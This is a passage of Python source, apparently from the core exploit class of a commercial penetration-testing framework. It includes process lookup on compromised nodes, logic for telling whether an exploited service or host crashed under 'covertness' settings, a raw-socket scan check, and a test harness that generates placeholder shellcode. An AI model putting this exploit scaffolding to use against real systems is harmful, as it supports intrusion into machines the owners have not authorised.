        If pid is already a string representation of an integer, we return that instead
        of course, this means you cannot get the "pid" of a process named "1234"
        
        """
        try:
            pid=dInt(name)
        except:
            pid=-1
        
        if pid!=-1:
            return pid
            
        #print "Matching with %s"%name
        if "win32api" in node.capabilities:
            self.log("Getting ps listing")
            mod=self.engine.getModuleExploit("ps")
            mod.link(self,nodes=[node])
            mod.run()
            pslist=mod.result[0]
            for p in pslist:
                #print "looking at %d %s"%(p["pid"],p["exe"])
                if p["exe"].upper()==name.upper():
                    pid=p["pid"]
                    break
        return pid

    def log(self, message, host=None):
        
        if self.target:

            if not host:
                host=self.target.interface
            
            if CanvasConfig["session_logging"]:
                self.engine.current_logging_host = host

            if hasattr(self, "netmask"):
                if host:
                    host = host + "/%s" % self.netmask
                else: 
                    host = "/%s" % self.netmask
            
            message="(%s) %s" % ( host, message )
                
        hostlistener.log(self,message)

        self.loggedInformation += [message]

        return 
    
    def check_crashed(self):
        """
        Override this to check the crashed status of your target. Typically this means
        rerun the test() function and maybe try to connect to the host as well

        """
        #A default way to check crashed services
        self.crashed_status=self.CRASHED_UNKNOWN
        if self.covertness > 4:
            self.log("Covertness level %d - not checking crashed status"%self.covertness)
            return self.crashed_status
        try:
            ret=self.test()
        except:
            ret=0
        if ret:
            self.log("Service still appears to respond to our test - did not crash")
            self.crashed_status=self.CRASHED_STILLALIVE
        else:
            self.log("Test failed - either service crashed or host crashed...")
            if hasattr(self,"myDCE"):
                self.log("We are a MSRPC exploit")
                self.log("Waiting 60 seconds to test in case we crashed an important service that causes the box to reboot")
                time.sleep(60)
                if self.state==self.HALT:
                    self.crashed_status=self.CRASHED_SERVICE
                    self.log("Halted - not testing for crashed box...assuming service died")
                    return 0
            if self.host:    
                if self.checkAlive(self.host):
                    self.crashed_status=self.CRASHED_SERVICE
                    self.log("Crashed the service - the host did respond.")
                else:
                    self.log("The host did not respond - it may be rebooting.")
                    self.crashed_status=self.CRASHED_HOST
        #return our crashed status...
        return self.crashed_status
                
    def can_scanrand(self):

        if self.node.nodetype!="LocalNode":
            self.log("Cannot do a scanrand-style scan from a remote node.")
            #can't do scanrand from remote nodes
            return 0
        
        try:
            mysender=sender()
        except:
            self.log("Failed to open a raw socket...")
            return 0
        return 1
            
    
def main():
    mysploit=canvasexploit()
    mysploit.badstring="\x00\r\n\x2c\x2f"
    mysploit.shellcode="D"*300
    #mysploit.easychunk(64,16,0)
    mysploit.createTestShellcode()
    #print prettyhexprint(mysploit.shellcode[60:])
    print "%s"%(prettyprint(mysploit.shellcode))
    

if __name__=="__main__":
    main()
